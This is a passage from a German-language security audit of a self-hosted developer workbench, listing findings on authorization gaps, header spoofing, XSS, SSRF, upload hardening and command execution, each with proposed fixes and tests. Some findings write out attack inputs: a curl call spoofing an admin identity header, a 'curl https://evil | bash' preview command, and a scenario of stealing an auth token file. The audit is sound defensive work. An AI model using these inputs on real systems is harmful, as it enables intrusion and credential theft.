**Empfohlene Loesung:** `requireWorkbenchAdmin` fuer `activate` + `login-session` + `DELETE`; `GET` lesend (E-Mails schwaerzen, S-015); UI-Hinweis „wirkt serverweit".
**Betroffene Architekturentscheidungen:** Account-Modell (Singleton vs pro-Benutzer, langfristig).
**Alternativen:** Pro-Benutzer-Accounts — Trade-off: grosser Umbau, langfristig sauberer.
**Trade-offs:** Single-User unberuehrt.
**Implementierungsschritte:** 1. Guards. 2. Maskierung GET. 3. UI-Hinweis. 4. Tests.
**Tests:** Non-Admin `activate` → 403; Admin → 200 + Audit.
**Akzeptanzkriterien:** Nur Admins wechseln globale Accounts.
**Abhaengigkeiten:** D-009 (Saga-Sichtbarkeit) gemeinsam.
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### S-003 Persistente Config-Manipulation ohne Admin (T3-Kanal, Monitoring, Appearance)

**Kategorie:** Security (AuthZ, Supply-Chain)
**Schweregrad:** High (T3-Kanal) / Medium (Rest)
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/system/routes.ts:60-135`, `.../services/t3ChannelService.ts`, `scripts/sync-t3-channel.sh`
**Betroffene Funktionen oder Komponenten:** `POST /api/v1/system/t3-channel`, `PUT /api/v1/system/usage-monitoring`, `PUT .../appearance|context-menu|mascot|...`, `PUT /api/v1/notifications/settings`
**Problembeschreibung:** Alle schreiben persistent nach `config/wrapt.local.json` ohne Admin. T3-Kanal wird beim naechsten Restart via `npm install t3@<kanal>` angewendet (Prozess-Kill, Port-Rebind). Nightly→Stable-Downgrade kann `state.sqlite`-Migrationen brechen.
**Technische Ursache:** Fehlende Rollentrennung (wie S-001).
**Ausloeser:** `POST /system/t3-channel {"channel":"nightly"}` + `POST /system/restart` als Non-Admin.
**Beispielszenario:** Non-Admin stellt Nightly, triggert Restart → npm-Install, Sitzungen beendet, Schema-Risiko. Oder schaltet Usage-Monitoring ab → Kostenblindheit.
**Auswirkungen:** Supply-Chain (Paketwechsel), Verfuegbarkeit, Datenrisiko, Tarnung (Appearance).
**Warum es leicht uebersehen wird:** Einstellungen wirken „harmlos"; Kanalwechsel-Bestaetigung fehlt.
**Empfohlene Loesung:** Alle hinter `requireWorkbenchAdmin`; T3-Wechsel zusaetzlich bestaetigen (Backup-Hinweis `state.sqlite`); Audit-Alert.
**Betroffene Architekturentscheidungen:** Config-Schreibrechte.
**Alternativen:** Kanalwechsel nur via SSH/Config-Datei (Endpoint entfernen) — Trade-off: Komfort vs Sicherheit.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Guards. 2. Doppel-Bestaetigung T3. 3. Alert. 4. Tests (403 lässt Datei unveraendert).
**Tests:** Non-Admin → 403; Admin → 200.
**Akzeptanzkriterien:** Wie S-001 plus klickbarer Hinweis nur fuer Admins.
**Abhaengigkeiten:** S-001, A-012 (Backup-Pflicht).
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### S-004 Keine Mandanten-Isolation (IDOR by Design)

**Kategorie:** Security (AuthZ, IDOR)
**Schweregrad:** High bei Multi-User, Medium bei Single-User
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/orbit/routes.ts:32-153` + `orbit/database.ts:83-142` (Single-Doc), `.../notes/routes.ts:16-70`, `.../filesystem/routes.ts:19-88` + `fileManagerService.ts:38-59`, `.../projects/routes.ts:20-44`, `.../skills/routes.ts:21-65`
**Betroffene Funktionen oder Komponenten:** `GET/PUT /orbit`, `/notes/*`, `/filesystem/*`, `/projects/*`, `/skills/*` (alle ohne `userId`)
**Problembeschreibung:** Alle Stores global ohne `userId`-Spalte/Filter. Hook authentisiert nur „erlaubter Benutzer", autorisiert kein Objekt. Zweiter Eintrag sieht/ueberschreibt alles; Skills-Mutationen schreiben in fremde Homes + `gitPush`.
**Technische Ursache:** Single-User-Design, aber `allowedUsers` erlaubt mehrere Identitaeten.
**Ausloeser:** Als Zweit-Identitaet `GET /orbit` oder `/filesystem/tree?path=...`.
**Beispielszenario:** Gast listet `/projects`, liest `.ssh/config` (falls unter Root), pusht Skills-Repo mit eigenem Commit.
**Auswirkungen:** Horizontale Voll-Kompromittierung bei Multi-User.
**Warum es leicht uebersehen wird:** Single-User-Tests zeigen nie Zweit-Zugriff.
**Empfohlene Loesung:** Kurzfristig: dokumentieren „nur vertrauenswuerdige `allowedUsers`" oder auf 1 begrenzen (Warnung bei >1); Skills-Mutationen hinter Admin. Mittelfristig: `userId`-Scoping oder Roots pro Benutzer.
**Betroffene Architekturentscheidungen:** Mandantenfaehigkeit (Doku vs Partitionierung vs Instanz-pro-Benutzer).
**Alternativen:** Instanz pro Benutzer (Tailscale-ACL + zwei Dienste) — Trade-off: Betriebskomplexitaet vs Code-Umbau.
**Trade-offs:** Migration bestehender Daten (mittel).
**Implementierungsschritte:** 1. Warnung/Doku. 2. Admin-Gate Skills. 3. Scoping-Plan. 4. Zwei-Identitaeten-Tests.
**Tests:** A schreibt, B darf nicht lesen (nach Fix) bzw. dokumentiertes Verhalten (vor Fix).
**Akzeptanzkriterien:** Entweder Isolation oder explizite Warnung + Admin-only Skills.
**Abhaengigkeiten:** A-013.
**Geschaetzter Umfang:** Medium (Doku+Gate) / Large (Partitionierung)
**Risiko bei der Umsetzung:** Medium

### S-005 Preview-Gateway ohne AuthN, Cookies hostweit

**Kategorie:** Security (AuthN/AuthZ, Session-Hijacking)
**Schweregrad:** High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/previews/gateway.ts:339-635`, `.../previews/slots.ts:542-607` (Ownership nur Management-API), `.../previews/routing.ts`
**Betroffene Funktionen oder Komponenten:** Slot-Listener `https://<host>:<publicPort>/*` (+WS), `resolveRoute`, `proxyRequestHeaders`, `adjustEmbeddingPolicy`
**Problembeschreibung:** Gateway-Listener ohne Identity-/Origin-Pruefung, `rateLimit:false`, `helmet:false`. Einzige Pruefung: Slot zugewiesen + nicht quarantaeniert. Slot-URL erratbar/sichtbar. `Set-Cookie: Domain=localhost` nur geloggt, nicht blockiert — Cookies hostweit fuer alle Slots.
**Technische Ursache:** Trennung Management-API (stark) vs Datenpfad (keine Pruefung).
**Ausloeser:** `GET https://<host>:<slotPort>/` als Tailnet-Fremder oder Zweit-Benutzer auf fremden Slot.
**Beispielszenario:** Opfer-Preview mit Login-Session (Cookie-Auth auf DevServer); Angreifer ruft Slot-URL auf → DevServer antwortet → hostweites Cookie lesbar/nutzbar.
**Auswirkungen:** Fremdzugriff auf Dev-Inhalte, Session-Uebernahme bei Cookie-Apps.
**Warum es leicht uebersehen wird:** Management-API-Tests sind gruen; Datenpfad separat.
**Empfohlene Loesung:** Listener hinter Tailscale-Identitaet oder Slot-URLs mit unerratbarem Token (`?slotToken`, validiert in `resolveRoute`); `Domain=localhost`-Cookies zurueckweisen/umschreiben (fail-closed); eigenes Rate-Budget.
**Betroffene Architekturentscheidungen:** Gateway-Auth (Identitaet vs Token vs signierte Kurz-URLs).
**Alternativen:** Nur via Workbench-iframe mit signierter URL — Trade-off: externe Tabs/Deep-Links brechen.
**Trade-offs:** Tailscale-Serve-Config + Gateway-Umbau, E2E-Anpassung (mittel).
**Implementierungsschritte:** 1. Token/Identitaet. 2. Cookie-Enforcement. 3. Rate-Limit. 4. Fremd-Identitaet-Tests.
**Tests:** Fremd ohne Besitz → 404/403; `Domain=localhost` → blockiert; ohne Token → 403.
**Akzeptanzkriterien:** Kein slot-fremder Tailnet-Zugriff; Isolation dokumentiert/erzwungen.
**Abhaengigkeiten:** Tailscale-Serve-Config.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Medium

### S-006 Loopback-Header-Spoofing (`tailscale-user-login` faelschbar)

**Kategorie:** Security (AuthN)
**Schweregrad:** High (untrusted Projekt-Code) / Medium (Single-User)
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/security/workbench-identity.ts:48-76,87-107`, `.../services/editorOpen.ts:24-27` (`request.ip` vs `socket.remoteAddress`), `.../previews/routes.ts:75-78` (sicher: `socket.remoteAddress`)
**Betroffene Funktionen oder Komponenten:** Alle `/api/*` via Loopback
**Problembeschreibung:** `requestIdentity` vertraut Header blind. `requestLocalLoopbackIdentity` verweigert Loopback-Trust bei vorhandenem Header — lokaler Prozess mit selbst gesetztem Header wird als Tailscale-Identitaet akzeptiert. Jeder Loopback-faehige Code (Terminal, DevServer, Skill-Hook, gleiche UID) kann sich als beliebiger Eintrag inkl. Admin ausgeben.
**Technische Ursache:** Keine kryptografische Bindung Identitaet↔Proxy (kein mTLS/Token); Header faelschbar ab Loopback.
**Ausloeser:** `curl -H "tailscale-user-login: <admin>" http://127.0.0.1:3010/api/v1/...` aus Terminal/Preview.
**Beispielszenario:** Geklontes Demo-Repo mit boesartigem DevServer (S-013) ruft Workbench-API mit gespooftem Admin-Header → liest Filesystem, schaltet Accounts, triggert Restart.
**Auswirkungen:** Preview-/Terminal-Code = Workbench-Admin.
**Warum es leicht uebersehen wird:** Header kommt „vom Proxy" — Loopback-Akteure unsichtbar.
**Empfohlene Loesung:** Dokumentieren (Projekt-Code vertrauenswuerdig, gleiche UID); Tailscale Serve soll Client-Header strippen (Proxy-Config pruefen); sensible Mutationen perspektivisch mit Capability-Token; `editorOpen:isLoopback` auf `socket.remoteAddress` (wie Preview-Doctor).
**Betroffene Architekturentscheidungen:** Lokale Auth (Header → Token/mTLS, oder Unix-Socket).
**Alternativen:** Backend nur via Unix-Socket + Client-Zertifikat — Trade-off: Deploy-Umbau.
**Trade-offs:** Doku+Fix gering; Token-Pflicht mittel.
**Implementierungsschritte:** 1. Doku + Preview-Warnung („nur vertrauenswuerdige Repos"). 2. `request.ip`-Fix. 3. Proxy-Strip pruefen. 4. Token-Plan.
**Tests:** Loopback mit Spoof ohne Proxy-Signatur → 401 (nach Fix); `X-Forwarded-For`-Spoof → 403 ohne Token.
**Akzeptanzkriterien:** Technische Trennung oder explizite Doku + Warnung.
**Abhaengigkeiten:** S-011/S-013.
**Geschaetzter Umfang:** Small (Doku+Fix) / Medium (Token)
**Risiko bei der Umsetzung:** Low-Medium

### S-007 XSS via T3/Hermes-Proxy (gleiche Origin); Uploads mitigiert

**Kategorie:** Security (XSS)
**Schweregrad:** High (Upstream-Kompromittierung → Uebernahme) / Low (Uploads, mitigiert)
**Sicherheit der Einschaetzung:** Medium-High
**Betroffene Dateien:** `apps/server/src/services/t3Proxy.ts:213-216,218-228,258-289`, `.../hermes/dashboard-proxy.ts:227-272`, `.../orbit/routes.ts:73-81`, `.../filesystem/routes.ts:40-48`, `apps/web/src/components/files/QuickLook.tsx:146-162`, `.../skillEditor/MarkdownEditor.tsx:56-58`, `.../plugins/PluginPreview.tsx:206`
**Betroffene Funktionen oder Komponenten:** `GET /t3/*`, `GET /hermes/*`, Asset-`inline`-Auslieferung, QuickLook-`highlightCode`
**Problembeschreibung:** T3/Hermes pfadbasiert in Workbench-Origin; Upstream-CSP entfernt, Bridge injiziert. XSS im Upstream laeuft in Workbench-Origin und ruft Workbench-API mit Opfer-Identitaet auf. Uploads dagegen gut (`sandbox` ohne `allow-scripts`, `nosniff`); QuickLook-`hljs` escapet, nur Tag-Splitting-Rest (kein aktiver Pfad nachgewiesen); Markdown/DOMPurify ok.
**Technische Ursache:** Pfad-Proxy statt Origin-Isolation + notwendige Injektion.
**Ausloeser:** Kompromittiertes `t3@nightly`/Hermes-Build liefert `<script>` → Proxy liefert aus.
**Beispielszenario:** Opfer oeffnet `/t3` nach Nightly-Update mit manipuliertem JS → JS liest `/api/v1/accounts`, triggert Restart — Full-Takeover.
**Auswirkungen:** Workbench-Uebernahme bei Upstream-Kompromittierung.
**Warum es leicht uebersehen wird:** Proxy „zeigt nur an"; CSP-Entfernung steht tief im Code.
**Empfohlene Loesung:** Langfristig eigene Origin (Subdomain/Port, `frame-ancestors`); kurzfristig Version-Pinning + Nightly-Warnung + Upstream-CSP mergen (mind. `script-src 'self'` + Nonce); QuickLook-Zeilen durch DOMPurify/Text-Rendering.
**Betroffene Architekturentscheidungen:** Embed-Architektur (Pfad vs Origin).
**Alternativen:** Nur externer Browser (kein Embedding) — Trade-off: Komfortverlust.
**Trade-offs:** CSP-Merge kann Funktionen brechen (mittel); Origin-Trennung gross.
**Implementierungsschritte:** 1. CSP-Merge. 2. Pinning+Warnung. 3. QuickLook-Fix. 4. Origin-Plan.
**Tests:** Upstream-HTML mit `<script>` → kein ausfuehrbares Fremdscript; SVG-inline → kein Alert (Sandbox-Playwright).
**Akzeptanzkriterien:** Origin-Trennung oder CSP-Merge + Nightly-Warnung.
**Abhaengigkeiten:** A-012.
**Geschaetzter Umfang:** Medium (Merge+Tests) / Large (Trennung)
**Risiko bei der Umsetzung:** Medium

### S-008 Health-CORS `*` + unauthentisierter Info-Leak

**Kategorie:** Security (CORS, Info-Leak)
**Schweregrad:** Low-Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/system/routes.ts:34-58`, `.../security/workbench-identity.ts:129`, `.../app/hooks.ts:63-67`
**Betroffene Funktionen oder Komponenten:** `GET /api/v1/health`, `OPTIONS`, `GET /readiness`
**Problembeschreibung:** Health ohne Identitaet + `Access-Control-Allow-Origin: *`. Antwort: `version`, `appName`, `instanceName`, `bootId`, `webBuildId`. Readiness verraet DB-/Verzeichnis-Beschreibbarkeit.
**Technische Ursache:** Bequemlichkeit (Polling/E2E/externe Checks).
**Ausloeser:** Beliebige besuchte Website fetcht Tailnet-Health cross-origin (simples GET, kein Preflight).
**Beispielszenario:** Angreiferseite liest periodisch → `bootId`-Wechsel = Restart-Orakel; `version` = Fingerprint; `instanceName` = Phishing-Personalisierung.
**Auswirkungen:** Fingerprinting, Restart-Orakel, Minor-Privacy.
**Warum es leicht uebersehen wird:** „Health muss offen sein" gilt als normal.
**Empfohlene Loesung:** `ACAO:*` entfernen (kein Header oder Echo nur Workbench-Origin); Payload minimieren (`status: ok`) oder hinter Identitaet (separater Ping fuer E2E); Readiness-Details nicht an Unauthentisierte.
**Betroffene Architekturentscheidungen:** Health-Sichtbarkeit.
**Alternativen:** Auf Tailscale-ACL verlassen — Trade-off: schuetzt nicht vor besuchter Seite auf gleichem Geraet.
**Trade-offs:** Gering (Same-Origin-Polling unberuehrt).
**Implementierungsschritte:** 1. Header entfernen. 2. Payload teilen (public minimal/privat voll). 3. Header-Assert-Test.
**Tests:** Cross-Origin-Fetch → ohne `ACAO:*`; Unit-Assert Header.
**Akzeptanzkriterien:** Kein `*`, kein Version/BootId-Leak an Fremd-Origin.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### S-009 Rate-Limit-Luecken (Proxys/WS/Gateway ausgenommen, Report unlimitiert)

**Kategorie:** Security (Rate-Limit, DoS, Spam)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/app/plugins.ts:42-65,69`, `.../api/routes.ts:21-25`, `.../services/t3Proxy.ts:355-367`, `.../hermes/dashboard-proxy.ts:311-316`, `.../previews/gateway.ts:383,595-631`, `.../notifications/routes.ts:57-65`, `.../orbit/routes.ts:42,98`, `.../terminal/protocol.ts:38`
**Betroffene Funktionen oder Komponenten:** T3/Hermes/Gateway-Proxys, `POST /notifications/report`, Terminal-WS, Orbit-Uploads
**Problembeschreibung:** Teuerste Pfade vom globalen Limit (1200/min shared, `keyGenerator` pro Identitaet, Health/Non-API-Allowlist) ausgenommen. `POST /report` (Titel/Body/Stack/Logs/Env-Map) ohne Limit → DB-/Push-Spam. Terminal-WS ohne Nachrichten-Limit (nur 16-MB-Payload). Shared `127.0.0.1`-Budget: legitime Last verdraengt sich; Angreifer fuellt gezielt.
**Technische Ursache:** Performance-Ausnahmen zu grob (ganzes Proxy statt nur Assets).
**Ausloeser:** `POST /report`-Loop oder 16-MB-WS-Frames.
**Beispielszenario:** 500 Reports/min → DB waechst, Push-Versand (Concurrency 4, 10-s-Timeout) staut sich, Metriken verfaelscht. Oder WS-Flut → `node-pty`-CPU.
**Auswirkungen:** DoS, Kosten (Push), Fuellung, Verdraengung.
**Warum es leicht uebersehen wird:** Einzelne Limits (restart/update/dev-start) existieren — sieht „abgedeckt" aus.
**Empfohlene Loesung:** `POST /report` 10/min; Gateway/T3/Hermes eigenes Budget (z. B. 600/min/Identitaet); Terminal-WS Token-Bucket pro Socket; teure Mutationen mit pro-Route-Budgets (auf report/orbit-save ausweiten).
**Betroffene Architekturentscheidungen:** Limit-Topologie (pro Identitaet statt IP — noetig wegen geteilter 127.0.0.1).
**Alternativen:** Nur Monitoring statt Block — Trade-off: erkennt, verhindert nicht.
**Trade-offs:** Zu strikte Limits brechen HMR/WS (E2E beobachten).
**Implementierungsschritte:** 1. Report-Limit. 2. Proxy-Budgets. 3. WS-Bucket. 4. Burst-Tests.
**Tests:** 30 Reports/60 s → 429; Gateway-Flood → 429; WS-Flood → Close 1013.
**Akzeptanzkriterien:** Kein unlimitierter schreibender Endpunkt; Proxys gedrosselt ohne legitime Brueche.
**Abhaengigkeiten:** P-004 (Poll-Reduktion) gemeinsam.
**Geschaetzter Umfang:** Small-Medium
**Risiko bei der Umsetzung:** Low-Medium

### S-010 Upload-Haertung: schwaches `sanitizeName`, client-kontrollierte MIME, Dotfiles

**Kategorie:** Security (Uploads, Path-Traversal-Vorstufe)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/filesystem/fileSystemHelpers.ts:47-49`, `.../filesystem/fileManagerService.ts:138-163,218-273`, `.../orbit/assets.ts:17-18,103-143`, `.../filesystem/routes.ts:59-68`, `.../orbit/routes.ts:42-48,98-103`
**Betroffene Funktionen oder Komponenten:** `sanitizeName`, `rename/mkdir/upload/move`, Orbit-`safeMime`/`createStream`
**Problembeschreibung:** `sanitizeName` ersetzt nur `[\\/\\0]`, trimmt, 255-Cap. Nicht abgelehnt: `.`, `..`, nur-Punkte/Leerzeichen, Steuerzeichen, fuehrende Punkte (`.bashrc`, `.ssh`). `join(dir, "..")` escapet in Parent (innerhalb Root, falsches Verzeichnis). `safeMime` akzeptiert beliebiges `type/subtype` aus Client-`mimetype` (inkl. `text/html`, `application/javascript`); keine Magic-Byte-Pruefung. Quotas gut (100 MB, 50 GB, `wx`, Temp 0600).
**Technische Ursache:** Minimal-Sanitizing statt Allowlist.
**Ausloeser:** `POST /filesystem/upload` mit `filename=".."` oder `".bashrc"`.
**Beispielszenario (Multi-User):** B laedt `.bashrc` mit Prompt-Command ins gemeinsame Home (Root = Home) → naechste Shell von A (gleicher OS-User!) sourcet es → RCE im Kontext A. Single-User nur Selbstgefaehrdung (Terminal hat ohnehin RCE).
**Auswirkungen:** Persistenz via Dotfiles, Verwirrung via `..`, MIME-Mismatch.
**Warum es leicht uebersehen wird:** `contained`-Pruefungen existieren — Name selbst ungeprueft.
**Empfohlene Loesung:** Reject `.`/`..`/nur-Punkte/Leerzeichen/Steuerzeichen; `contained`-Recheck auch fuer finalen `target` in upload/mkdir; Dotfile-Uploads nur mit Bestaetigung oder Admin; Orbit-`inline`-Allowlist (SVG nur `attachment`); Magic-Byte-Check.
**Betroffene Architekturentscheidungen:** Upload-Root (ggf. eigener `uploads/`-Ordner statt Home).
**Alternativen:** Upload-Root trennen — Trade-off: Dateimanager-Konzept aendert sich.
**Trade-offs:** Legitime Dotfiles (`.env`) dann mit Bestaetigung (UX-Abwaegung).
**Implementierungsschritte:** 1. `sanitizeName` haerten. 2. Recheck. 3. Dotfile-Policy. 4. MIME-Allowlist.
**Tests:** Upload `..` → 400; `.bashrc` → 400/Warnung; `evil.html` als `image/png` → `octet-stream`/Ablehnung.
**Akzeptanzkriterien:** Kein Parent-Escape via Name; keine stillen Dotfile-Writes.
**Abhaengigkeiten:** S-004/S-011.
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### S-011 Pfad-Traversal-Abwehr gut, aber Config-Root teilbar (Terminal kann Config ueberschreiben)

**Kategorie:** Security (Path Traversal, Privilege Boundary)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/filesystem/fileManagerService.ts:72-116`, `.../filesystem/projectBrowserService.ts:61-105`, `.../services/projectFileService.ts:32-110`, `.../terminal/restore.ts:16-26,169-196`, `.../utils/pathRoots.ts`, `config/wrapt.example.json:24-29`
**Betroffene Funktionen oder Komponenten:** `contained`+`realpath`+`O_NOFOLLOW` (vorbildlich); Roots unter Home; `canonicalCwdWithinRootsSync`
**Problembeschreibung:** Direkte Abwehr vorbildlich (Symlink-Ablehnung, Realpath-Doppelpruefung, atomare No-Replace-Moves). Restrisiko: Roots + Repo-Config (`config/wrapt.local.json`) liegen in via Terminal/Filesystem beschreibbarer Zone (gleicher OS-User). Jeder mit Terminal kann Config editieren + Restart triggern (S-001) → beliebige Settings (Ports, Pfade, T3-Kanal, `hermes.cliPath`/`pythonPath`, `terminal.shell.file`).
**Technische Ursache:** Keine Trennung Code/Config vs Arbeitsdaten bei gleichem User.
**Ausloeser:** Terminal-Write in Config-Dir + `POST /system/restart`.
**Beispielszenario:** Gast aendert `hermes.cliPath` auf eigenes Script → naechster Updatecheck (`execFile(cliPath, ["update","--check"])`) fuehrt es aus.
**Auswirkungen:** Persistente RCE als Server-User, Config-Backdoor ueber Restart.
**Warum es leicht uebersehen wird:** Traversal-Tests gruen → „Pfade sicher".
**Empfohlene Loesung:** Config-/Repo-Pfade aus `terminalAllowedRoots` ausnehmen (Deny-Liste oder engere Roots); kritische Pfade (`cli.*`, `hermes.*`, `t3.*`, `terminal.shell`) nur via Datei (SSH) oder Admin+Alert; `execFile` mit Binary-Allowlist.
**Betroffene Architekturentscheidungen:** Selbst-Entwicklung („Workbench entwickelt sich selbst" braucht Repo-Zugriff fuer Admins → Admin-Ausnahme statt Totalverbot) vs Haertung; ggf. zweiter OS-User (grosser Umbau, sauberste Loesung).
**Alternativen:** Zweiter OS-User — Trade-off: systemd/tmux-Permissions-Umbau.
**Trade-offs:** Legitime Selbst-Entwicklung vs Sperre (mittel).
**Implementierungsschritte:** 1. Deny-Liste. 2. Admin-Ausnahme. 3. Allowlist `execFile`. 4. CWD-Tests.
**Tests:** Terminal-`cwd` auf Config-Dir → `INVALID_CWD`; FileManager-Write in `config/` → 403 (nach Fix).
**Akzeptanzkriterien:** Arbeits-Code kann Server-Config/Binaries nicht umbiegen (ausser Admin).
**Abhaengigkeiten:** S-001.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Medium

### S-012 SSRF/Open-Redirect via `/proxy/*`, Push gut, Gateway-`Location` Luecken

**Kategorie:** Security (SSRF, Open Redirect)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** Medium Confidence
**Betroffene Dateien:** `apps/server/src/api/proxy.ts:5-83`, `.../app/dependencies.ts:88-106`, `.../security/public-http.ts:44-110`, `.../notifications/push.ts:41,160,203-210`, `.../previews/gateway.ts:61-106`, `.../hermes/dashboard-proxy.ts:36-48`
**Betroffene Funktionen oder Komponenten:** `GET /api/v1/proxy/*`, Push-Registrierung, Slot-Redirects
**Problembeschreibung:** `/proxy/*` gut (Allowlist + Redirect-Origin-Check + HTML-415 + `sandbox` + `no-store`). Luecken: (a) `fetch` ohne gepinnten DNS-Lookup (Push hat `createPublicLookup`) → DNS-Rebinding erlaubter Origin auf 127.0.0.1/Link-Local nach Check moeglich (TOCTOU). (b) `proxyOrigins` aus Projekt-Config (via S-011/S-004 manipulierbar). (c) Gateway reicht externe `Location`/`Link` durch → DevServer kann Opfer zu Phishing-URL schicken (Open-Redirect via vertrauenswuerdiger Slot-Origin).
**Technische Ursache:** Uneinheitliche SSRF-Haertung (Push stark, Proxy mittel).
**Ausloeser:** Angreifer-DNS mit Rebinding; DevServer-`302 → https://evil`.
**Beispielszenario:** DNS loest erst oeffentlich (Check ok), dann 127.0.0.1:3010 → Proxy fetcht interne API (ohne Header → 401, aber `/health` offen → Recon/Timing-Orakel).
**Auswirkungen:** Interner Recon, Health-Leak-Verstaerker, Phishing via Slot-Redirect.
**Warum es leicht uebersehen wird:** Allowlist + Redirect-Check sehen „fertig" aus.
**Empfohlene Loesung:** `fetch` mit gepinntem Lookup (wie Push) + IP-Recheck nach Redirect; `proxyOrigins` nur aus vertrauenswuerdiger Quelle (nicht Projekt-Config ohne Admin); externe Gateway-`Location` auf Allowlist oder Warnseite.
**Betroffene Architekturentscheidungen:** Proxy-Vertrauensquellen.
**Alternativen:** Endpoint entfernen (nur direkte iframes) — Trade-off: Workspace-Tests brechen.
**Trade-offs:** Niedrig-mittel.
**Implementierungsschritte:** 1. Gepinnter Agent. 2. Origin-Quellen. 3. Redirect-Policy. 4. Rebinding-/Redirect-Tests.
**Tests:** Rebinding auf 127.0.0.1 → blockiert; Fremd-Redirect → 403; Slot-Extern-Redirect → Warnung.
**Akzeptanzkriterien:** Kein privater/Link-Local-Fetch via Proxy; kein stiller Extern-Redirect via Slot.
**Abhaengigkeiten:** S-008 (Health-Leak verstaerkt), S-004.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Low-Medium

### S-013 Command-Execution/Persistenz via Preview-Laufzeit (`preview.config.json` → `bash -lc`)

**Kategorie:** Security (Command Injection, Persistenz)
**Schweregrad:** Medium (trusted Projekte: Low)
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/previews/DevServerManager.ts:168-189,418-442,473-489,223-248`, `.../previews/runtimeProfiles.ts`, `.../previews/routes.ts:139-164`
**Betroffene Funktionen oder Komponenten:** `serviceCommand` (`shellQuote` gut, aber Inhalt aus Projekt), `POST .../dev-servers/:projectId/start|launch|restart` (12/min)
**Problembeschreibung:** Befehl aus Projektdaten (teils Auto-Detect aus `package.json`-Scripts). Ausfuehrung `/usr/bin/env PATH=<sanitized> FORCE_COLOR=0 /bin/bash -lc <command>` in tmux; Erstsitzung via `systemd-run --user --scope` ausserhalb Backend-Cgroup (ueberlebt Restart — beabsichtigt, aber Persistenzmechanismus). Watchdog startet Fehlgeschlagenes neu (max 3/5min). Quoting verhindert Escape aus Argumenten, nicht boesartigen Inhalt.
**Technische Ursache:** Projekt-Code = Shell-Code by Design.
**Ausloeser:** `preview.config.json` mit `"command": "curl https://evil | bash"` + `POST .../start`.
**Beispielszenario:** Opfer klont Demo-Repo, klickt „Start" (oder Watchdog nach Crash) → Befehl als Server-User → liest `~/.codex/auth.json`, exfiltriert, legt Scope an der Restart ueberlebt.
**Auswirkungen:** RCE als Server-User bei untrusted Repos; Persistenz ueber Restart.
**Warum es leicht uebersehen wird:** Eigene Projekte sind harmlos; `shellQuote` sieht „sicher" aus.
**Empfohlene Loesung:** Erkannten Befehl + Pfad + PATH-Sanitisierung im UI explizit bestaetigen (erstmalig pro Projekt/Hash), Setup-Commands separat; `npm run dev` erzwingen wo moeglich (laut `.env.example` beabsichtigt — pruefen ob `runtimeProfiles` garantiert); Watchdog nur fuer bestaetigte Befehle; Stop toetet Scopes verlaesslich.
**Betroffene Architekturentscheidungen:** Preview-Exec-Modell (Bestaetigung vs Container/Namespace — letzteres grosser Infra-Umbau).
**Alternativen:** Container/Namespace — Trade-off: grosser Umbau.
**Trade-offs:** UX-Reibung beim legitimen Entwickeln (mittel).
**Implementierungsschritte:** 1. Bestaetigungs-Flow + Hash. 2. `npm run dev`-Garantie pruefen. 3. Watchdog-Gate. 4. Stop-Verifikation.
**Tests:** Unbestaetigt → 409 mit Befehls-Vorschau; bestaetigter Hash → Start; Watchdog startet Unbestaetigtes nicht.
**Akzeptanzkriterien:** Kein stiller Exec unbestaetigter Projekt-Befehle.
**Abhaengigkeiten:** S-006 (Spoof verstaerkt), S-011.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Medium

### S-014 Sensitive Daten in Logs/Client + unvollstaendige Audit-Abdeckung

**Kategorie:** Security (Info-Leak, Audit-Logging)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/app/buildApp.ts:25-35` (Redaction gut), `.../hermes/redaction.ts:1-35` (gut), `.../previews/diagnostics.ts:178-195` (HMAC-Pseudonym gut), `.../notifications/routes.ts:57-65`, `.../usage/routes.ts:42-43`, `.../previews/DevServerManager.ts:223-248`, `.../observability/audit.ts:201-213`, `.../app/hooks.ts:69-91`
**Betroffene Funktionen oder Komponenten:** `POST /notifications/report` (`environment`-Map unredigiert, global lesbar), `GET /accounts*` (E-Mail/Profile/Plan), DevServer-`logs()` (nur ANSI-Strip), Audit-Scope (nur `/api/v1`-Mutationen ausser Presence; Proxys/Gateway/WS nicht auditiert)
**Problembeschreibung:** Positiv: Logger-/Hermes-Redaction, Preview-Pseudonym, Audit-Hashkette mit Outbox. Luecken: (a) Crash-Reports mit freier `environment`-Map + Logs/Stack persistent + lesbar + push-faehig. (b) DevServer-Logs oft mit Tokens (`VITE_API_KEY`, npm-Token) ohne Scrubbing, 7-Tage-Retention. (c) T3-Runs/Hermes-Prompts/Terminal-Befehle/Gateway-Routing ohne Audit-Spur; Actor aus spoofbarem Header (S-006).
**Technische Ursache:** Redaction punktuell statt zentral; Audit-Scope an URL-Praefix gekoppelt.
**Ausloeser:** `POST /report {"environment":{"API_KEY":"…"}}`; Token in Orbit/Note (Revisionen 500 + Backups behalten es; Loeschen genuegt nicht); `Authorization: Bearer` im DevServer-Log.
**Auswirkungen:** Secret-Persistenz, Multi-User-Leak, forensische Luecken.
**Warum es leicht uebersehen wird:** Redaction existiert — Abdeckung lueckenhaft.
